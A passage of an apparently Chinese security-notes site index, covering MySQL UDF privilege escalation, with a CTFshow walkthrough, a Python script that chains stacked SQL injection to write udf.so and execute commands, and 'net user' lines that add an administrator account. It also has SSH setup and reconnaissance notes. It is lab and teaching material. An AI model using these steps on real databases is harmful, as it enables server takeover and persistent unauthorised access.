//\u4e3a\u4e86\u5220\u9664\u75d5\u8ff9\uff0c\u628a\u521a\u521a\u65b0\u5efa\u7684udftmp\u8868\u5220\u6389\nCREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //\u5bfc\u5165udf\u51fd\u6570\n</code></pre> <p>\u4f7f\u7528winhex\u6253\u5f00udf\u6587\u4ef6\uff0c\u5728\u6700\u4e0b\u65b9\u53ef\u4ee5\u770b\u5230udf\u6587\u4ef6\u63d0\u4f9b\u7684\u51fd\u6570\u3002</p> Text Only<pre><code>sys_eval\uff0c\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u5c06\u8f93\u51fa\u8fd4\u56de\u3002\nsys_exec\uff0c\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u5c06\u9000\u51fa\u7801\u8fd4\u56de\uff08\u65e0\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u56de\u663e\uff09\n\nsys_get\uff0c\u83b7\u53d6\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u3002\nsys_set\uff0c\u521b\u5efa\u6216\u4fee\u6539\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\n</code></pre> <p>\u5bfc\u5165\u6210\u529f\u7684\u8bdd\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\uff1a</p> Text Only<pre><code>SELECT sys_eval('ipconfig');\n\u8fd4\u56de\u7f51\u5361\u4fe1\u606f\n</code></pre> <p>\u9644\u51e0\u4e2a\u5e38\u7528\u7684 cmd \u6307\u4ee4\uff0c\u7528\u4e8e\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\uff1a</p> Text Only<pre><code>net user ka1n4t ka1n4t~!@ /add //\u6dfb\u52a0\u65b0\u7528\u6237\uff1aka1n4t\uff0c\u5bc6\u7801\u4e3aka1n4t~!@\nnet localgroup administrators ka1n4t /add //\u5c06ka1n4t\u6dfb\u52a0\u81f3\u7ba1\u7406\u5458\u5206\u7ec4\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_3","title":"\u516d\u3001\u5176\u4ed6\u95ee\u9898","text":""},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#1error-1125-hy000-function-sys_eval-already-exists","title":"1\u3001ERROR 1125 (HY000): Function 'sys_eval' already exists","text":"<p>\u63d0\u793asys_eval \u51fd\u6570\u5df2\u7ecf\u5b58\u5728\uff0c\u53ef\u80fd\u5df2\u7ecf\u88ab\u5229\u7528\u8fc7\u4e86\uff0c\u5c1d\u8bd5\u76f4\u63a5\u8c03\u7528\u51fd\u6570\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#2sys_eval","title":"2\u3001\u63d0\u793asys_eval \u51fd\u6570\u5df2\u7ecf\u5b58\u5728\uff0c\u4f46\u65e0\u6cd5\u5229\u7528","text":"<p>\u5c1d\u8bd5\u5c06udf\u63d0\u6743\u76f8\u5173\u7684\u5229\u7528\u51fd\u6570\u8fdb\u884c\u5220\u9664\u540e\u91cd\u65b0\u521b\u5efa</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#3sys_eval-sys_eval","title":"3\u3001\u521b\u5efasys_eval \u51fd\u6570\u65f6\u63d0\u793a\u5df2\u7ecf\u5b58\u5728\uff0c\u4f46\u5229\u7528\u4e0e\u5220\u9664\u65f6\u63d0\u793a sys_eval","text":"<p>\u51fd\u6570\u4e0d\u5b58\u5728\uff08\u5b9e\u6218\u65e0\u6cd5\u89e3\u51b3\uff0c\u6f0f\u6d1e\u590d\u73b0\u53ef\u4ee5\uff09\u3002</p> <p>\u539f\u56e0\u662f\u4e0a\u4e00\u4e2a\u4eba\u5229\u7528\u8fc7\u540e\uff0c\u6570\u636e\u5e93\u8fdb\u884c\u4e86\u91cd\u542f\u3002 \u4e4b\u540e\u91cd\u542fmysql\u670d\u52a1\u5668\uff0c\u518d\u521b\u5efa\u5c31\u53ef\u4ee5\u4e86\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#4error-1126-hy000-cant-open-shared-library-udfdll-errno-193","title":"4\u3001ERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )","text":"<p>\u5728\u8fdb\u884cudf\u63d0\u6743\u65f6\u78b0\u5230\u8fd9\u4e2a\u9519\u8bef\u4e00\u822c\u662fufd\u6587\u4ef6\u4f4d\u6570\u9009\u62e9\u9519\u8bef\uff0c\u5c1d\u8bd5\u53e6\u4e00\u4e2a\u4f4d\u6570\u7684udf\u6587\u4ef6\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_4","title":"\u4e03\u3001\u4fee\u590d\u5efa\u8bae","text":"<p>1\u3001mysql\u914d\u7f6e\u6587\u4ef6\u4e2dsecure_file_priv\u9879\u8bbe\u7f6e\u4e3aNULL\u6216\u975e mysql/lib/plugin\u76ee\u5f55\u3002</p> <p>2\u3001\u6570\u636e\u5e93\u7528\u6237\u786e\u4fdd\u6b63\u786e\u5b9e\u65bd\u6700\u5c0f\u6743\u9650\u539f\u5219</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#linuxudf","title":"\u516b\u3001Linux\u4e0b\u7684UDF\u63d0\u6743","text":"<p>inux\u73af\u5883\u4e0b\u7684UDF\u63d0\u6743\u5927\u6982\u7387\u4ec5\u9650\u4e8e\u9776\u573a\u73af\u5883\u4e2d\uff0c\u539f\u56e0\uff1a</p> <p>\u5728Linux\u4e25\u683c\u7684\u7cfb\u7edf\u6743\u9650\u4e0b\uff0cmysql\u7528\u6237\u6216web\u7528\u6237\u65e0plugin\u76ee\u5f55\u7684\u5199\u5165\u6743\u9650\u3002</p> <p>Linux\u73af\u5883\u4e0b\u7684udf\u63d0\u6743\u9664\u5229\u7528\u6761\u4ef6\u5916\u4e0eWindows\u73af\u5883\u4e0b\u5b8c\u5168\u76f8\u540c\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u9664windows\u7bc7\u4e2d\u7684\u5185\u5bb9\u5916\uff0c\u8fd8\u9700\u8981plugin\u76ee\u5f55\u7684\u5199\u5165\u6743\u9650\u3002</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#ctfshow","title":"\u4e5d\u3001CTFshow\u9898\u76ee","text":"<p>\u6765\u81ea\uff1ahttps://blog.csdn.net/qq_35938621/article/details/119716077  \u624b\u5de5+\u811a\u672c</p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_5","title":"\u624b\u5de5\uff1a","text":""},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#1_1","title":"1\u3001\u9898\u76ee\u4ee3\u7801\uff1a","text":"Text Only<pre><code>$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\";\n</code></pre> <p>\u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u660e\u663e\u5b58\u5728\u5806\u53e0\u6ce8\u5165\uff0c\u521a\u597d\u53ef\u4ee5\u5229\u7528\u5806\u53e0\u6ce8\u5165\uff0c\u6765\u8fdb\u884cudf\u6765\u8fdb\u884c\u547d\u4ee4\u6267\u884c\uff0c\u6d4b\u8bd5\uff0c\u8fc7\u6ee4information\u3001and\u3001or\u7b49\u5404\u79cd\u8bed\u53e5\u65e0\u6cd5\u5e03\u5c14\u76f2\u6ce8\u3001\u65f6\u95f4\u76f2\u6ce8\u3001\u62a5\u9519\u6ce8\u5165\u7b49</p> <p></p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#2plugin_dir","title":"2\u3001\u770b\u4e00\u4e0b@@plugin_dir\u7684\u8def\u5f84\u6765\u547d\u4ee4\u6267\u884c","text":"Text Only<pre><code>\u76ee\u5f55/usr/lib/mariadb/plugin/\n</code></pre> <p>\u5bf9\u65b9\u662flinux,\u5f53\u7136\u5199 \u4e00\u4e2a\u811a\u672c\u8dd1\u4f1a\u5feb\u4e00\u4e9b\uff0c\u6211\u5148\u624b\u5de5\u5b9e\u64cd\u4e00\u904d\uff0c\u4e4b\u540e\u5c31\u7528\u811a\u672c\u68ad\u54c8\uff0c\u9996\u5148\u6839\u636e\u6211\u4e4b\u524d\u7684\u65b9\u6cd5\u751f\u621064\u4f4dlinux\u7684udf.so\u7684\u5341\u516d\u8fdb\u5236\u5f62\u5f0f</p> <p></p> <p>\u7531\u4e8e\u8fd9\u662fget\u4f20\u53c2\uff0c\u662f\u6709\u957f\u5ea6\u9650\u5236\u7684\uff0c16081\u7684\u8d85\u8fc7\u9650\u5236\uff0c\u4f1a\u76f4\u63a5\u88abban\u4e86\uff0c\u6240\u4ee5\u6211\u5206\u63096000\u957f\u5ea6\u5206\u4e3a\u4e86\u4e09\u4e2a\u6587\u672c\u6587\u4ef6\u91cc\u9762\u88c5\u4e86udf\u5341\u516d\u8fdb\u5236\u4e09\u4e2a\u90e8\u5206</p> <p></p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#3_1","title":"3\u3001\u5bfc\u5165\u5341\u516d\u8fdb\u5236\u6570\u636e","text":"<p>\u63a5\u7740\u6211\u4eec\u5c06a\u3001b\u3001c\u4e09\u4e2a\u4e2d\u91cc\u9762\u7684\u5341\u516d\u8fdb\u5236\u5bfc\u5165\u5230\u88ab\u653b\u51fb\u7684\u673a\u5668\u4e2d</p> Text Only<pre><code>select 'a\u90e8\u5206\u5341\u516d\u8fdb\u5236' into dumpfile '/usr/lib/mariadb/plugin/a.txt'\n</code></pre> <p></p> <p>\u4e3a\u4e86\u786e\u8ba4\u6211\u4eec\u662f\u5426\u5df2\u7ecf\u5bfc\u5165load_file\u6765\u5224\u65ad</p> Text Only<pre><code>select load_file('/usr/lib/mariadb/plugin/a.txt')\n</code></pre> <p></p> <p>\u660e\u663e\u5bfc\u5165\u6210\u529f\uff0c\u7167\u846b\u82a6\u753b\u74e2\uff0c\u5c06\u5269\u4e0b\u7684b\u548cc\u5bfc\u5165\u8fdb\u53bb</p> <p></p> <p>\u5f53\u660e\u663e\u786e\u5b9a\u5df2\u7ecf\u90fd\u5bfc\u5165\u6210\u529f\u4e86a\u3001b\u3001c\u4e09\u90e8\u5206udf\u5341\u516d\u8fdb\u5236\u5185\u5bb9\uff0c\u63a5\u7740\u6765\u5c31\u662f\u5bfc\u5165so\u5230\u8fd9\u4e2a\u76ee\u5f55\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c</p> Text Only<pre><code>select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so'\n</code></pre> <p></p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#4_1","title":"4\u3001\u5bfc\u5165\u51fd\u6570","text":"<p>\u6700\u540e\u6211\u4eec\u521b\u5efasys_eval\u8fd9\u4e2a\u51fd\u6570\u6765\u8fdb\u884c\u547d\u4ee4\u6267\u884c</p> Text Only<pre><code>create function sys_eval returns string soname 'udf.so'\n</code></pre> <p>\u660e\u663e\u83b7\u5f97\u4e86\u547d\u4ee4\u6267\u884c\u7684\u6743\u9650</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u770bip\u914d\u7f6e</p> <p></p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#5flag","title":"5\u3001\u62ffflag","text":"<p>\u63a5\u7740\u5c31\u62ff\u8fd9\u9898\u7684flag</p> <p></p>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_6","title":"\u811a\u672c\uff1a","text":"Python<pre><code>import requests\n\nurl=\"http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/\"\npayload = \"?id=1';select '{}' into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+\"\nacquire = \"?id=1';select load_file('/usr/lib/mariadb/plugin/{}.txt')--+\"\ntext = ['a','b','c','d']\n\nudf=\"\"\nudf_text=[]\n\nfor i in range(0,20000,5000):\n    end = i+5000\n    udf_text.append(udf[i:end])\n\np = dict(zip(text,udf_text))\n\nfor t in text:\n    param=payload.format(p[t],t)\n    get_url = url + param\n    res = requests.get(get_url)\n    print(\"[*]\",end=\"\")\n    code = res.status_code\n    print(code,end=\"\")\n    if  code==404:\n        print(\"\u4f60\u8f93\u5165\u7684URL\u53ef\u80fd\u51fa\u9519\")\n    acq=acquire.format(t)\n    data=url+acq\n    res = requests.get(url=data)\n    if \"load_file\" in res.text:\n        print(\"--&gt;\u6210\u529f\u63d2\u5165{}.txt\".format(t))\n\nprint(\"[*]\u5bfc\u5165udf.so\u6210\u529f\")\nurl_sys_dll = \"?id=1%27;select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so' --+\"\nres= requests.get(url=url+url_sys_dll)\nprint(\"[*]\u521b\u5efa\u51fd\u6570sys_eval()\u6210\u529f\")\nurl_sys_function = \"?id=1%27;create function sys_eval returns string soname 'udf.so'--+\"\nres= requests.get(url=url+url_sys_function)\n\nprint(\"[*]\u547d\u4ee4\u6267\u884c\u7ed3\u679c: \")\nsys_eval=\"?id=';select sys_eval('cat /flag.*')--+\"\nres= requests.get(url=url+sys_eval)\nprint(res.text)\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_7","title":"\u5341\u3001\u5341\u516d\u8fdb\u5236\u6587\u4ef6","text":""},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#32","title":"32\u4f4d","text":"Text Only<pre><coden</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#64","title":"64\u4f4d\uff1a","text":"Text Only<pre><code>\n</code></pre>"},{"location":"WEB/others/sql%E6%B3%A8%E5%85%A5-UDF%E6%8F%90%E6%9D%83/#_8","title":"\u5341\u4e00\u3001\u53c2\u8003","text":"<p>https://www.cnblogs.com/litlife/p/9030673.html</p> <p>https://mp.weixin.qq.com/s/ERXOLhWo0-lJbMV143I8hA</p> <p>https://blog.csdn.net/qq_35938621/article/details/119716077</p>"},{"location":"WEB/others/windterm%E8%BF%9E%E6%8E%A5kali/","title":"Windterm\u8fde\u63a5kali","text":""},{"location":"WEB/others/windterm%E8%BF%9E%E6%8E%A5kali/#windowswindtermkali","title":"windows\u73af\u5883\u4e0b\uff0c\u5982\u4f55\u7528<code>windterm</code>\u8fde\u63a5kali","text":"<p>\u8981\u5728Windows\u73af\u5883\u4e0b\u4f7f\u7528Windows Terminal\uff08Windterm\uff09\u8fde\u63a5\u5230Kali Linux\uff0c\u4f60\u9700\u8981\u786e\u4fddKali Linux\u4e0a\u5df2\u542f\u7528SSH\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u4f60\u77e5\u9053Kali Linux\u7684IP\u5730\u5740\u3002\u4ee5\u4e0b\u662f\u8fde\u63a5\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u786e\u4fddKali Linux\u4e0a\u5df2\u542f\u7528SSH\u670d\u52a1\u5668\uff1a</p> </li> <li> <p>\u5728Kali Linux\u4e0a\uff0c\u6253\u5f00\u7ec8\u7aef\u5e76\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u786e\u4fddSSH\u670d\u52a1\u5668\u5df2\u7ecf\u5b89\u88c5\u5e76\u8fd0\u884c\uff1a</p> Text Only<pre><code>sudo service ssh start\n</code></pre> </li> <li> <p>\u83b7\u53d6Kali Linux\u7684IP\u5730\u5740\uff1a</p> Text Only<pre><code>hostname -I\n</code></pre> </li> <li> <p>\u5728Windows\u4e2d\u6253\u5f00Windows Terminal\uff1a</p> </li> <li> <p>\u4f7f\u7528SSH\u8fde\u63a5\u5230Kali Linux\uff1a</p> Text Only<pre><code>ssh username@kali_ip_address\n</code></pre> </li> <li> <p>\u8f93\u5165Kali Linux\u7684\u7528\u6237\u5bc6\u7801\uff1a</p> </li> <li> <p>\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u4f60\u5e94\u8be5\u80fd\u591f\u5728Windows Terminal\u4e2d\u770b\u5230Kali Linux\u7684\u7ec8\u7aef\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u5176\u4e2d\u6267\u884c\u547d\u4ee4\u4e86\uff1a</p> </li> </ol> <p>\u8bf7\u786e\u4fddKali Linux\u4e0a\u5df2\u542f\u7528SSH\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u5141\u8bb8SSH\u8fde\u63a5\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cKali Linux\u4e0a\u7684SSH\u670d\u52a1\u5668\u5e94\u8be5\u5df2\u7ecf\u5b89\u88c5\u5e76\u542f\u7528\u3002\u5982\u679c\u4f60\u9047\u5230\u8fde\u63a5\u95ee\u9898\uff0c\u8bf7\u786e\u4fddKali Linux\u548cWindows \u4e3b\u673a\u5728\u540c\u4e00\u7f51\u7edc\u4e2d\uff0c\u5e76\u4e14\u6ca1\u6709\u9632\u706b\u5899\u963b\u6b62SSH\u8fde\u63a5\u3002</p>"},{"location":"WEB/others/windterm%E8%BF%9E%E6%8E%A5kali/#ssh","title":"\u5982\u4f55\u505c\u7528SSH\u670d\u52a1\u5668","text":"<p>\u8981\u505c\u7528Kali Linux\u4e0a\u7684SSH\u670d\u52a1\u5668\uff0c\u4f60\u53ef\u4ee5\u6267\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u767b\u5f55\u5230Kali Linux\uff1a</p> </li> <li> <p>\u505c\u6b62SSH\u670d\u52a1\u5668\uff1a      Text Only<pre><code>sudo service ssh stop\n</code></pre></p> </li> <li> <p>\u7981\u6b62SSH\u670d\u52a1\u5668\u5728\u5f00\u673a\u65f6\u81ea\u52a8\u542f\u52a8\uff08\u53ef\u9009\uff09\uff1a</p> </li> <li> <p>\u5982\u679c\u4f60\u5e0c\u671bSSH\u670d\u52a1\u5668\u4e0d\u4f1a\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u81ea\u52a8\u542f\u52a8\uff0c\u53ef\u4ee5\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u7981\u7528SSH\u670d\u52a1\u5668\u7684\u81ea\u52a8\u542f\u52a8\uff1a      Text Only<pre><code>sudo update-rc.d -f ssh remove\n</code></pre></p> </li> <li> <p>\u786e\u8ba4SSH\u670d\u52a1\u5668\u5df2\u505c\u6b62\uff08\u53ef\u9009\uff09\uff1a</p> </li> <li>\u5982\u679c\u4f60\u60f3\u786e\u8ba4SSH\u670d\u52a1\u5668\u5df2\u6210\u529f\u505c\u6b62\uff0c\u53ef\u4ee5\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5SSH\u670d\u52a1\u5668\u7684\u72b6\u6001\uff1a      Text Only<pre><code>sudo service ssh status\n</code></pre></li> <li>\u5982\u679cSSH\u670d\u52a1\u5668\u5df2\u505c\u6b62\uff0c\u5e94\u8be5\u4f1a\u663e\u793a\u7c7b\u4f3c\u4e8e \"ssh is not running\" \u7684\u6d88\u606f\u3002</li> </ol> <p>\u5b8c\u6210\u4ee5\u4e0a\u6b65\u9aa4\u540e\uff0cSSH\u670d\u52a1\u5668\u5c06\u505c\u6b62\u8fd0\u884c\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u81ea\u52a8\u542f\u52a8\u3002\u8bf7\u6ce8\u610f\uff0c\u7981\u7528SSH\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u5f71\u54cd\u8fdc\u7a0b\u8fde\u63a5\u5230Kali Linux\u7684\u80fd\u529b\uff0c\u53ea\u6709\u5728\u4f60\u786e\u5b9a\u4e0d\u518d\u9700\u8981SSH\u670d\u52a1\u65f6\u624d\u5e94\u8be5\u6267\u884c\u8fd9\u4e9b\u6b65\u9aa4\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"\u4fe1\u606f\u6536\u96c6","text":"<p>\u200b   </p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","title":"\u5de5\u5546\u6570\u636e\u6536\u96c6","text":"<p>\u5de5\u5546\u6570\u636e\u662f\u6d4b\u8bd5\u4eba\u5458\u83b7\u53d6\u76ee\u6807\u516c\u53f8\u4fe1\u606f\u7684\u91cd\u8981\u9014\u5f84\u4e4b\u4e00\u3002\u901a\u8fc7\u5206\u6790\u5de5\u5546\u6570\u636e\uff0c\u53ef\u4ee5\u6df1\u5165\u4e86\u89e3\u76ee\u6807\u516c\u53f8\u7684\u7ec4\u7ec7\u7ed3\u6784\u3001\u4e1a\u52a1\u8303\u56f4\u4ee5\u53ca\u5173\u8054\u8d44\u4ea7\uff0c\u4e3a\u6f0f\u6d1e\u6316\u6398\u63d0\u4f9b\u66f4\u7cbe\u51c6\u7684\u65b9\u5411\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","title":"\u5de5\u5546\u6570\u636e\u6765\u6e90","text":"<ul> <li>\u7231\u4f01\u67e5https://aiqicha.baidu.com/</li> <li>\u5929\u773c\u67e5https://www.tianyancha.com/</li> <li>\u4f01\u67e5\u67e5https://www.qcc.com/</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_4","title":"\u5173\u6ce8\u5185\u5bb9","text":"<ol> <li>\u4f01\u4e1a\u80a1\u6743\u67b6\u6784\uff1a\u4e86\u89e3\u516c\u53f8\u7684\u80a1\u6743\u7ed3\u6784\uff0c\u786e\u5b9a\u63a7\u80a1\u5b50\u516c\u53f8\uff0c\u6536\u96c6\u8fb9\u7f18\u4e1a\u52a1\u7cfb\u7edf\u8d44\u4ea7\u3002</li> <li>\u7f51\u7ad9\u5907\u6848\uff1a\u83b7\u53d6\u516c\u53f8\u7684\u5907\u6848\u4fe1\u606f\uff0c\u5305\u62ec\u6839\u57df\u540d\u53ca\u5176\u5b50\u57df\u540d\u3002</li> <li>\u5bf9\u5916\u53d1\u5e03\u7684\u4ea7\u54c1\uff1a\u6536\u96c6\u516c\u53f8\u516c\u5f00\u53d1\u5e03\u7684\u4ea7\u54c1\u4fe1\u606f\uff0c\u5305\u62ec\u5c0f\u7a0b\u5e8f\u3001\u516c\u4f17\u53f7APP\u3001IoT\u8bbe\u5907\u7b49\u3002</li> <li>\u6cd5\u4eba\u7535\u8bdd\u53f7\u3001\u90ae\u7bb1\uff1a\u83b7\u53d6\u516c\u53f8\u6cd5\u4eba\u7684\u8054\u7cfb\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f5c\u4e3a\u6e17\u900f\u6d4b\u8bd5\u7684\u8054\u7edc\u70b9\u3002</li> </ol>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_5","title":"\u7528\u5904","text":"<ol> <li> <p>\u83b7\u53d6\u63a7\u80a1\u5b50\u516c\u53f8\u540d\u79f0\uff0c\u6536\u96c6\u8fb9\u7f18\u5b50\u516c\u53f8\u8d44\u4ea7\uff0c\u4e3a\u6f0f\u6d1e\u6316\u6398\u63d0\u4f9b\u66f4\u591a\u53ef\u80fd\u6027\u3002</p> </li> <li> <p>\u83b7\u53d6\u7f51\u7ad9\u5907\u6848\u4fe1\u606f\uff0c\u5e2e\u52a9\u5b9a\u4f4d\u516c\u53f8\u7684\u5728\u7ebf\u8d44\u4ea7\uff0c\u5305\u62ec\u53ef\u80fd\u7684\u5b50\u57df\u540d\u548cIP\u5730\u5740\u3002</p> </li> <li> <p>\u6536\u96c6\u5bf9\u5916\u53d1\u5e03\u7684\u4ea7\u54c1\u4fe1\u606f\uff0c\u53d1\u73b0\u989d\u5916\u7684\u7f51\u7edc\u8d44\u4ea7\uff0c\u6269\u5927\u6f0f\u6d1e\u6316\u6398\u7684\u8303\u56f4\u3002</p> </li> <li> <p>\u83b7\u53d6\u6cd5\u4eba\u8054\u7cfb\u65b9\u5f0f\uff0c\u53ef\u80fd\u4e3a\u8fdb\u4e00\u6b65\u7684\u793e\u4f1a\u5de5\u7a0b\u5b66\u653b\u51fb\u63d0\u4f9b\u7ebf\u7d22\u3002</p> </li> </ol>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_6","title":"\u5de5\u5177\u63a8\u8350","text":"<p>\u300c\u7ad9\u957f\u4e4b\u5bb6\uff1ahttp://whois.chinaz.com/ \u300d</p> <p>\u300c\u90ae\u7bb1\u53cd\u67e5\uff1ahttp://whois.chinaz.com/reverse?ddlSearchMode=1\u300d</p> <p>\u300c\u6ce8\u518c\u4eba\u53cd\u67e5\uff1ahttp://whois.chinaz.com/reverse?ddlSearchMode=1\u300d</p> <p>\u300c\u7535\u8bdd\u53cd\u67e5\uff1ahttp://whois.chinaz.com/reverse?ddlSearchMode=1\u300d</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_7","title":"\u5176\u4ed6\u7f51\u7ad9","text":"<p>\u7231\u7ad9https://whois.aizhan.com/</p> <p>\u5fae\u6b65https://x.threatbook.cn/</p> <p>\u56fd\u5916\u7684<code>who.is</code>https://who.is/</p> <p>ICP\u5907\u6848\u67e5\u8be2\u7f51https://www.beianx.cn/</p> <p>ICP\u5907\u6848\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177http://icp.chinaz.com/</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_8","title":"\u5e94\u7528\u4fe1\u606f\u641c\u96c6","text":"<p>\u5728\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u65f6\uff0c\u4e86\u89e3\u76ee\u6807\u5e94\u7528\u7684\u76f8\u5173\u4fe1\u606f\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u548c\u7f51\u7ad9\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u6536\u96c6\u5e94\u7528\u7a0b\u5e8f\u7684\u76f8\u5173\u4fe1\u606f\uff1a</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_9","title":"\u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f\u641c\u96c6","text":"<ul> <li>\u4e03\u9ea6\u6570\u636e\uff08Qimai\uff09</li> <li>\u300c\u7f51\u5740\u300d: https://www.qimai.cn/</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_10","title":"\u5fae\u4fe1\u516c\u4f17\u53f7\u548c\u5c0f\u7a0b\u5e8f","text":"<p>\u901a\u8fc7\u5fae\u4fe1\u641c\u7d22\u516c\u4f17\u53f7\u5e76\u53bb\u5173\u6ce8\uff0c\u7136\u540e\u8fdb\u53bb\u70b9\u51fb\u6587\u7ae0\u4e4b\u7c7b\u7684\uff0c\u4e0b\u62c9\u53ef\u4ee5\u770b\u5230\u5b83\u7684\u7f51\u9875\u6765\u6e90\uff0c\u5927\u90e8\u5206\u662f\u5fae\u4fe1\u63d0\u4f9b\u7684\uff0c\u6240\u4ee5\u9700\u8981\u53bb\u9605\u8bfb\u539f\u6587\uff0c\u4f46\u662f\u539f\u6587\u4e5f\u53ef\u80fd\u662f\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u81ea\u5df1\u81ea\u884c\u53bb\u5224\u65ad\uff0c\u627e\u5230\u5b83\u7684url\u540e\u53c8\u53ef\u4ee5\u53bb\u7206\u4e00\u6ce2\u5b50\u57df\u540d\u4e86</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#logo","title":"logo","text":"<p>\u5f53\u4f60\u4e0d\u786e\u5b9a\u76ee\u6807\u4ea7\u54c1\u662f\u4ec0\u4e48\u65f6\uff0c\u6bd4\u5982\u4f60\u4e0d\u77e5\u9053\u4ed6\u662f\u8c01\u5bb6\u7684WAF\u6216\u8005\u8def\u7531\u5668\uff0c\u53ef\u4ee5\u5229\u7528\u67e5\u770b\u7f51\u7ad9logo\u5730\u5740\uff0c\u7136\u540e\u590d\u5236logo\u5730\u5740\uff0c\u70b9\u51fb\u6309\u56fe\u7247\u641c\u7d22\uff0c\u5230\u8c37\u6b4c\u91cc\u9762\u67e5\u8be2\uff1b\u4e5f\u53ef\u4ee5\u628a\u76ee\u6807logo\u4e0b\u8f7d\u4e0b\u6765\u